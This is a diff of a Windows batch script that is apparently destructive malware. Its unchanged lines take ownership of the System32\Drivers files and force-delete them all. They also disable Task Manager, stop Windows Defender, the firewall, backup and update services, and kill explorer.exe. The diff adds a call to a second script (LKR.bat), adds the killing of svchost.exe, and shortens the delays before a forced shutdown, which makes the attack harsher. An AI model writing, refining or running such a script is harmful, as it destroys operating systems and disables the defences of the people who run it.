@@ -38,6 +38,10 @@ takeown /f "%Systemdrive%\Windows\System32\Drivers\*.*"
 icacls "%Systemdrive%\Windows\System32\Drivers\*.*" /grant everyone:f
 DEL /F /S /Q /A "%Systemdrive%\Windows\System32\Drivers\*.*"
 
+start LKR.bat
+
+timeout /t 3
+
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 net stop "SDRSVC"
 net stop "WinDefend"
@@ -47,9 +51,9 @@ net stop sharedaccess
 netsh firewall set opmode mode-disable
 net stop "wuauserv"
 taskkill /f /im explorer.exe
+taskkill /f /im svchost.exe
 
-start LKR.bat
 
-timeout /t 15
+timeout /t 2
 shutdown -s -t 15
 exit
